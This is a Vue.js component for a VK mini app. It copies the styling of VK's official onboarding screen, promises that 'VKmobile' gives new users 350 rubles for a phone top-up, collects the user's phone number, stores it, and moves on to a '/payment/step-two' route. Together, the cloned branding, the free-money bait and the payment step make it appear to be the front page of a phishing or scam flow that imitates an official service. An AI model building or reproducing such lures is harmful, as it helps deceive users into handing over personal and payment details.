<template>
  <div>
        <div class="classicalOnboarding_container__2u2nr">
            <div class="classicalOnboarding_containerInner__3n5AW">
                <img src="../assets/logo.svg" class="classicalOnboarding_picture__3Ns_8">
                <div class="Div--android" style="text-align: left">
                    <h3 class="classicalOnboarding_header__3KbkZ" style="font-size: 17px; margin-top: 0px;">
                        Получите подарок
                    </h3>
                    <div class="classicalOnboarding_description__2HZHR" style="font-size: 14px; margin-top: 6px;">
                        VKmobile дарит новым пользователям сервиса 350 рублей на пополнение телефона
                    </div>
                </div>
                <div class="phone_vk">
                    <label for="phone" class="classicalOnboarding_title">Номер телефона</label>
                    <input type="text" class="FormField__border" id="phone" v-model="phone">
                </div>
                <div class="classicalOnboarding_actions__3RqeH">
                    
                    <button @click.prevent="nextStep" class="Tappable Tappable--android Button Button--android classicalOnboarding_continueButton__m6zNF Button--sz-l Button--lvl-primary Button--aln-center Button--sizeY-regular Tappable--inactive" style="width: 90%">
                        <div class="Button__in">
                            <a class="Headline Headline--android Headline--w-medium Button__content">Далее</a>
                        </div>
                    </button>
                    
                    <router-link to="/">
                        <button class="Tappable Tappable--android Button Button--android classicalOnboarding_continueButton__m6zNF Button--sz-l Button--lvl-secondary Button--aln-center Button--sizeY-regular Tappable--inactive" style="margin-top: 8px; width: 90%">
                            <div class="Button__in">
                                <a class="Headline Headline--android Headline--w-medium Button__content">Назад</a>
                            </div>
                        </button>
                    </router-link>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
import bridge from "@vkontakte/vk-bridge"
bridge.send("VKWebAppInit", {})

export default {
    data() {
        return {
            phone: '+7'
        }
    },
    methods: {
        checkNumber(num) {
            if (this.phone.length > 0 && this.phone.length == num) {
                this.$router.push('/payment/step-two')
            } else {
                alert('Номер введен неверно')
            }
        },
        nextStep() {
            if (this.phone.substring(0, 1) == '+') {
                this.checkNumber(12)
                bridge.send("VKWebAppStorageSet", {"key": "phone", "value": this.phone})
            } else {
                this.checkNumber(11)
                bridge.send("VKWebAppStorageSet", {"key": "phone", "value": this.phone})
            }
        },
    }
}
</script>
